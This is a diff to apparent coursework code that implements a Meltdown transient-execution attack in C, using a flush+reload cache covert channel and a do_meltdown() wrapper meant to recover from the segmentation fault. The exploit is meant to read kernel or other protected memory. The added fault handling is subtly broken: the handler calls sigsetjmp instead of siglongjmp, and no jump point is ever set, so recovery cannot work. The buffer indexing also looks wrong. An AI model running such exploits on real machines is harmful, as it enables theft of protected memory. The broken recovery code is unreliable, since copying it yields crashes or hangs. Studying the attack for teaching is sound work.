@@ -3,6 +3,7 @@
 #include <x86intrin.h>
 #include <sys/mman.h>
 #include <string.h>
+#include <signal.h>
 
 #define u64 uint64_t
 #define i64 int64_t
@@ -24,6 +25,7 @@ reside in a different memory page.
 
 Your task is to implement the four functions, test the accuracy of the covert channel, and report.
 */
+static jmp_buf sig_buf;
 static void *cc_buffer;
 static size_t cc_buf_size = 256 * 4096; // 256 cache lines, 4096 bytes apart (mem pages)
 static u64 threshold = 180; // should be below 160 , but whatever
@@ -52,6 +54,14 @@ static void flush_buf(){
     for (int i=0; i<(int) cc_buf_size/4096;i++){
         flush(&cc_buffer[i*512+i]);
     }
+}
+
+static void segfault_handler(int signum) {
+    sigset_t sigs;
+    sigemptyset(&sigs);
+    sigaddset(&sigs, signum);
+    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
+    sigsetjmp(sig_buf, 0);
 }
 
 
@@ -88,9 +98,8 @@ static int cc_receive() {
         maccess(cur_adrs);
         time = my_rdtsc() - time;
         flush(cur_adrs);
-        //printf("%lu;", time); // this stabilizes the measurement lol
+        //printf("%lu;", time); // this stabilizes the measurement lol (uncommented, we get less 254 fails)
         if (time<threshold) {
-            //printf("hit at %i\n", i);
             printf("\n");
             return i;
         } 
@@ -98,8 +107,6 @@ static int cc_receive() {
     printf("\n");
     return -1;
 }
-
-// --------------------------------------------------
 
 static void meltdown(uintptr_t adrs) {
     volatile int tmp = 0;
@@ -112,11 +119,31 @@ static void meltdown(uintptr_t adrs) {
 }
 
 
+/* The main problem of the code in meltdown is that if called with 
+   an invalid address, it crashes. In this task, you will implement 
+   the function int do_meltdown(uintptr_t adrs), which calls 
+   meltdown, recovers from the fault, receives the transmitted 
+   value from the channel, and returns it. You may want to read the 
+   man pages of signal(2) and sigsetjmp(3). Make sure that you can 
+   call do_meltdown several times without crash or hang. You may 
+   assume that the program does some one-time setup before calling 
+   do_meltdown.
 
-
+*/
 static int do_meltdown(uintptr_t adrs) {
-  // Implement
-  return -1;
+    // Init segfault handler
+    if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
+        printf("Failed to setup signal handler\n");
+        return -1;
+    }
+    
+    // call meltdown
+    meltdown(adrs);
+    int ret = cc_receive();
+  
+  
+  
+    return ret;
 }
 
 #ifdef MELTDOWNCASE
